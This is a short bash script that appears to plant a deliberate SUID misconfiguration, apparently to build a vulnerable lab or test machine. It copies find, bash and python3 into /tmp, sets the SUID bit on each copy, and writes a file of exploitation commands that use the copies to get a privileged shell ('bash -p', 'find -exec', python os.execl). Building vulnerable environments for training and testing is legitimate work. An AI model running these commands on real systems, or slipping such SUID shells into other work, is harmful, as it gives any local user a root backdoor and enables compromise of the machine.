#!/bin/bash
# vuln: suid_misconfiguration | severity: high
echo "[VULN] Injecting SUID Binary Misconfiguration..."
cp /usr/bin/find /tmp/find_suid 2>/dev/null || cp /bin/find /tmp/find_suid
chmod u+s /tmp/find_suid
cp /bin/bash /tmp/bash_suid
chmod u+s /tmp/bash_suid
chmod 755 /tmp/bash_suid
cp /usr/bin/python3 /tmp/python3_suid 2>/dev/null || true
chmod u+s /tmp/python3_suid 2>/dev/null || true
cat > /tmp/suid_vulns.txt << 'EOFTXT'
SUID MISCONFIGURED BINARIES
============================
/tmp/find_suid   -rwsr-xr-x  root
/tmp/bash_suid   -rwsr-xr-x  root
/tmp/python3_suid -rwsr-xr-x root

Exploitation:
  /tmp/find_suid . -exec /bin/bash -p \;
  /tmp/bash_suid -p
  /tmp/python3_suid -c 'import os; os.execl("/bin/bash","bash","-p")'
EOFTXT
echo "[VULN] SUID binaries injected. Exploit with: /tmp/bash_suid -p"
